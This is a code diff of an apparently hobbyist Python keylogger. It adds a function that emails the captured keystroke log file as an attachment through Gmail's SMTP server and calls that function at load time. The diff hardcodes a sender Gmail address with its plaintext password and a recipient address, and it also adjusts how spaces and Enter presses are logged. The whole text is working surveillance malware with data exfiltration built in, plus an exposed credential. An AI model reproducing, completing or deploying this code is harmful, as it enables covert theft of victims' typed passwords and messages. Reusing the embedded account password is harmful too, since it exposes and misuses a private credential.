@@ -29,12 +29,65 @@ from PIL import ImageGrab
 
 key_information = "key_log.txt"
 
+email_address = "binashrafyaseen@gmail.com"
+password = "Yaseen@bin.04"
+
+toaddr = "yaseenrather.0408@gmail.com"
+
 file_path = "C:\\Yaseen\\Projects\\Key_Logger_Python\\Project"
 extend = "\\"
 
 count = 0
 keys = []
 
+#Email
+
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = email_address
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet-stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename = %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, password)
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+
+send_email(key_information, file_path + extend + key_information, toaddr)
+
+
+# Key Logger logic
 def on_press(key):
     global keys, count 
 
@@ -52,11 +105,14 @@ def write_file(keys):
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
+                f.write(" ")
+                f.close()
+            elif k.find("enter") > 0:
                 f.write('\n')
                 f.close()
             elif k.find("Key") == -1:
-                f.write(k)
-                f.close()
+               f.write(k)
+               f.close()
 
 def on_release(key):
     if key == Key.esc:
